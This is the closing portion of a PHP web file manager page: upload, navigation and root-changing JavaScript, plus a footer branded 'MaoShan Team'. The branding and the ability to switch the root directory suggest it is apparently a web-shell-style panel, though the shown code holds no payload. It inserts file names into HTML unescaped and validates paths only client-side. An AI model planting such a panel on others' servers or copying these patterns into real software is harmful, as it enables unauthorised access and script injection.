                    if (!operationCancelled) {
                        console.error('Error:', error);
                        alert('An error occurred during the operation: ' + error.message);
                    }
                    hideProgress();
                });
        }

        function clearSelection() {
            document.querySelectorAll('.file-checkbox').forEach(function(checkbox) {
                checkbox.checked = false;
            });
            document.getElementById('selectAll').checked = false;
            updateBulkActions();
        }

        // Drag and Drop Event Handlers
        function initializeDragDrop() {
            const dragDropArea = document.getElementById('dragDropArea');
            
            if (!dragDropArea) return;
            
            // Remove existing event listeners to prevent duplicates
            dragDropArea.replaceWith(dragDropArea.cloneNode(true));
            const newDragDropArea = document.getElementById('dragDropArea');
            
            // Prevent default drag behaviors
            ['dragenter', 'dragover', 'dragleave', 'drop'].forEach(function(eventName) {
                newDragDropArea.addEventListener(eventName, preventDefaults, false);
                document.body.addEventListener(eventName, preventDefaults, false);
            });
            
            // Highlight drop area when item is dragged over it
            ['dragenter', 'dragover'].forEach(function(eventName) {
                newDragDropArea.addEventListener(eventName, highlight, false);
            });
            
            ['dragleave', 'drop'].forEach(function(eventName) {
                newDragDropArea.addEventListener(eventName, unhighlight, false);
            });
            
            // Handle dropped files
            newDragDropArea.addEventListener('drop', handleDrop, false);
            
            // Handle click to browse
            newDragDropArea.addEventListener('click', function(e) {
                e.preventDefault();
                document.getElementById('uploadFiles').click();
            });
        }

        function preventDefaults(e) {
            e.preventDefault();
            e.stopPropagation();
        }

        function highlight(e) {
            document.getElementById('dragDropArea').classList.add('drag-over');
        }

        function unhighlight(e) {
            document.getElementById('dragDropArea').classList.remove('drag-over');
        }

        function handleDrop(e) {
            const dt = e.dataTransfer;
            const files = dt.files;
            handleMultipleFileSelect(files);
        }

        function handleMultipleFileSelect(files) {
            console.log('Files selected:', files.length);
            
            if (!files || files.length === 0) {
                console.log('No files selected');
                return;
            }
            
            // Convert FileList to Array and add to selectedFiles
            const newFiles = Array.from(files);
            console.log('Processing files:', newFiles.map(function(f) { return f.name; }));
            
            // Check for duplicates and add unique files
            newFiles.forEach(function(file) {
                const isDuplicate = selectedFiles.some(function(existingFile) {
                    return existingFile.name === file.name && existingFile.size === file.size;
                });
                
                if (!isDuplicate) {
                    selectedFiles.push(file);
                }
            });
            
            console.log('Total selected files:', selectedFiles.length);
            updateSelectedFilesList();
            showSelectedFilesContainer();
        }

        function updateSelectedFilesList() {
            const container = document.getElementById('selectedFilesList');
            if (!container) return;
            
            container.innerHTML = '';
            
            selectedFiles.forEach(function(file, index) {
                const fileItem = document.createElement('div');
                fileItem.className = 'selected-file-item';
                fileItem.innerHTML = 
                    '<div class="file-info-item">' +
                        '<span class="file-icon-small">' + getFileIcon(file.name) + '</span>' +
                        '<div class="file-details-small">' +
                            '<div class="file-name-small">' + file.name + '</div>' +
                            '<div class="file-size-small">' + formatBytes(file.size) + '</div>' +
                        '</div>' +
                    '</div>' +
                    '<button class="remove-file-btn" onclick="removeSelectedFile(' + index + ')">✕</button>';
                container.appendChild(fileItem);
            });
        }

        function getFileIcon(filename) {
            const ext = filename.split('.').pop().toLowerCase();
            const imageExts = ['jpg', 'jpeg', 'png', 'gif', 'bmp', 'svg', 'webp'];
            const archiveExts = ['zip', 'rar', 'tar', 'gz', '7z'];
            const codeExts = ['php', 'js', 'html', 'css', 'json', 'xml'];
            
            if (imageExts.includes(ext)) return '🖼️';
            if (archiveExts.includes(ext)) return '📦';
            if (codeExts.includes(ext)) return '📝';
            return '📄';
        }

        function formatBytes(bytes) {
            if (bytes === 0) return '0 B';
            const k = 1024;
            const sizes = ['B', 'KB', 'MB', 'GB'];
            const i = Math.floor(Math.log(bytes) / Math.log(k));
            return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
        }

        function removeSelectedFile(index) {
            selectedFiles.splice(index, 1);
            updateSelectedFilesList();
            
            if (selectedFiles.length === 0) {
                hideSelectedFilesContainer();
            }
        }

        function clearSelectedFiles() {
            selectedFiles = [];
            hideSelectedFilesContainer();
            const fileInput = document.getElementById('uploadFiles');
            if (fileInput) {
                fileInput.value = '';
            }
        }

        function showSelectedFilesContainer() {
            const container = document.getElementById('selectedFilesContainer');
            if (container) {
                container.style.display = 'block';
            }
        }

        function hideSelectedFilesContainer() {
            const container = document.getElementById('selectedFilesContainer');
            if (container) {
                container.style.display = 'none';
            }
        }

        function startUpload() {
            console.log('Starting upload for', selectedFiles.length, 'files');
            
            if (selectedFiles.length === 0) {
                alert('Please select files to upload');
                return;
            }
            
            // Show progress container
            const progressContainer = document.getElementById('uploadProgressContainer');
            if (progressContainer) {
                progressContainer.style.display = 'block';
            }
            
            const startBtn = document.getElementById('startUploadBtn');
            if (startBtn) {
                startBtn.disabled = true;
            }
            
            // Initialize progress
            uploadQueue = selectedFiles.slice(); // Create a copy
            currentUploadIndex = 0;
            
            document.getElementById('totalCount').textContent = uploadQueue.length;
            document.getElementById('uploadedCount').textContent = '0';
            
            // Create individual progress items
            createIndividualProgressItems();
            
            // Start uploading files
            uploadNextFile();
        }

        function createIndividualProgressItems() {
            const container = document.getElementById('individualProgress');
            if (!container) return;
            
            container.innerHTML = '';
            
            uploadQueue.forEach(function(file, index) {
                const progressItem = document.createElement('div');
                progressItem.className = 'file-progress-item';
                progressItem.id = 'progress-item-' + index;
                progressItem.innerHTML = 
                    '<div class="file-progress-info">' +
                        '<div class="file-progress-name">' + file.name + '</div>' +
                        '<div class="file-progress-status">Waiting...</div>' +
                    '</div>' +
                    '<div class="file-progress-bar">' +
                        '<div class="file-progress-fill" id="progress-fill-' + index + '"></div>' +
                    '</div>' +
                    '<div class="file-status-icon" id="status-icon-' + index + '">⏳</div>';
                container.appendChild(progressItem);
            });
        }

        function uploadNextFile() {
            if (currentUploadIndex >= uploadQueue.length) {
                // All files uploaded
                completeUpload();
                return;
            }
            
            const file = uploadQueue[currentUploadIndex];
            const formData = new FormData();
            
            console.log('Uploading file:', file.name);
            
            // Create proper FormData for PHP
            formData.append('action', 'upload');
            formData.append('upload_files[]', file);
            
            // Update status
            updateFileProgress(currentUploadIndex, 0, 'Uploading...');
            
            // Simulate upload progress
            let progress = 0;
            const progressInterval = setInterval(function() {
                progress += Math.random() * 20;
                if (progress > 90) progress = 90;
                updateFileProgress(currentUploadIndex, progress, 'Uploading...');
            }, 200);
            
            fetch(window.location.href, {
                method: 'POST',
                body: formData
            })
            .then(function(response) {
                console.log('Upload response status:', response.status);
                return response.text();
            })
            .then(function(data) {
                console.log('Upload response:', data.substring(0, 200));
                clearInterval(progressInterval);
                updateFileProgress(currentUploadIndex, 100, 'Completed');
                const statusIcon = document.getElementById('status-icon-' + currentUploadIndex);
                if (statusIcon) {
                    statusIcon.textContent = '✅';
                }
                
                currentUploadIndex++;
                updateOverallProgress();
                
                // Upload next file after a short delay
                setTimeout(function() {
                    uploadNextFile();
                }, 300);
            })
            .catch(function(error) {
                console.error('Upload error:', error);
                clearInterval(progressInterval);
                updateFileProgress(currentUploadIndex, 0, 'Failed');
                const statusIcon = document.getElementById('status-icon-' + currentUploadIndex);
                if (statusIcon) {
                    statusIcon.textContent = '❌';
                }
                
                currentUploadIndex++;
                updateOverallProgress();
                
                // Continue with next file
                setTimeout(function() {
                    uploadNextFile();
                }, 300);
            });
        }

        function updateFileProgress(index, progress, status) {
            const progressFill = document.getElementById('progress-fill-' + index);
            const statusElement = document.querySelector('#progress-item-' + index + ' .file-progress-status');
            
            if (progressFill) {
                progressFill.style.width = progress + '%';
            }
            
            if (statusElement) {
                statusElement.textContent = status;
            }
        }

        function updateOverallProgress() {
            const completed = currentUploadIndex;
            const total = uploadQueue.length;
            const percentage = (completed / total) * 100;
            
            const progressBar = document.getElementById('overallProgressBar');
            const progressPercentage = document.getElementById('overallProgressPercentage');
            const uploadedCount = document.getElementById('uploadedCount');
            
            if (progressBar) {
                progressBar.style.width = percentage + '%';
            }
            if (progressPercentage) {
                progressPercentage.textContent = Math.round(percentage) + '%';
            }
            if (uploadedCount) {
                uploadedCount.textContent = completed;
            }
        }

        function completeUpload() {
            const progressBar = document.getElementById('overallProgressBar');
            const progressPercentage = document.getElementById('overallProgressPercentage');
            const uploadedCount = document.getElementById('uploadedCount');
            
            if (progressBar) {
                progressBar.style.width = '100%';
            }
            if (progressPercentage) {
                progressPercentage.textContent = '100%';
            }
            if (uploadedCount) {
                uploadedCount.textContent = uploadQueue.length;
            }
            
            // Show completion message
            setTimeout(function() {
                alert('Upload completed! ' + uploadQueue.length + ' file(s) uploaded successfully.');
                hideModal('uploadModal');
                location.reload();
            }, 1000);
        }

        // Close modal when clicking outside
        window.onclick = function(event) {
            var modals = document.getElementsByClassName('modal');
            for (var i = 0; i < modals.length; i++) {
                if (event.target == modals[i]) {
                    modals[i].style.display = 'none';
                }
            }
        }

        // Initialize bulk actions on page load
        document.addEventListener('DOMContentLoaded', function() {
            updateBulkActions();
        });

        // Path navigation functions
        function enablePathEdit() {
            const pathInput = document.getElementById('pathInput');
            const goBtn = document.getElementById('pathGoBtn');
            const cancelBtn = document.getElementById('pathCancelBtn');
            
            pathInput.readOnly = false;
            pathInput.focus();
            pathInput.select();
            goBtn.style.display = 'inline-block';
            cancelBtn.style.display = 'inline-block';
        }

        function cancelPathEdit() {
            const pathInput = document.getElementById('pathInput');
            const goBtn = document.getElementById('pathGoBtn');
            const cancelBtn = document.getElementById('pathCancelBtn');
            
            pathInput.readOnly = true;
            pathInput.value = '<?php echo addslashes($current_dir); ?>';
            goBtn.style.display = 'none';
            cancelBtn.style.display = 'none';
        }

        function navigateToPath() {
            const pathInput = document.getElementById('pathInput');
            const newPath = pathInput.value.trim();
            
            if (newPath) {
                // Basic validation
                if (newPath.includes('..') || newPath.includes('<') || newPath.includes('>')) {
                    alert('Invalid path. Please enter a valid directory path.');
                    return;
                }
                
                // Navigate to the new path
                window.location.href = '<?php echo FM_SELF_URL; ?>?dir=' + encodeURIComponent(newPath);
            }
        }

        // Handle Enter key in path input
        document.addEventListener('DOMContentLoaded', function() {
            const pathInput = document.getElementById('pathInput');
            if (pathInput) {
                pathInput.addEventListener('keypress', function(e) {
                    if (e.key === 'Enter') {
                        navigateToPath();
                    } else if (e.key === 'Escape') {
                        cancelPathEdit();
                    }
                });
            }
        });

        // Quick navigation functions
        function navigateToParent() {
            const currentPath = '<?php echo addslashes($current_dir); ?>';
            const parentPath = currentPath.substring(0, currentPath.lastIndexOf('/'));
            if (parentPath && parentPath !== '<?php echo addslashes(FM_ROOT_PATH); ?>'.substring(0, '<?php echo addslashes(FM_ROOT_PATH); ?>'.lastIndexOf('/'))) {
                window.location.href = '<?php echo FM_SELF_URL; ?>?dir=' + encodeURIComponent(parentPath);
            }
        }

        function navigateToRoot() {
            window.location.href = '<?php echo FM_SELF_URL; ?>?dir=' + encodeURIComponent('<?php echo addslashes(FM_ROOT_PATH); ?>');
        }

        // Root directory change function
        function changeRoot(newRoot) {
            if (newRoot && confirm('Change root directory to: ' + newRoot + '?')) {
                window.location.href = '<?php echo FM_SELF_URL; ?>?set_root=' + encodeURIComponent(newRoot);
            }
        }
    </script>
    <!-- Footer -->
    <div class="footer-custom">
        <div style="display: flex; justify-content: center; align-items: center; gap: 15px; flex-wrap: wrap;">
            <span class="brand">🔥 MaoShan Team</span>
            <span class="text-muted">|</span>
            <span class="heart">❤️</span>
            <span class="text-muted">Secure File Manager v2.0</span>
            <span class="text-muted">|</span>
            <span style="color: var(--text-muted); font-size: 11px;">Protected with 🔒</span>
        </div>
    </div>
</body>
</html>
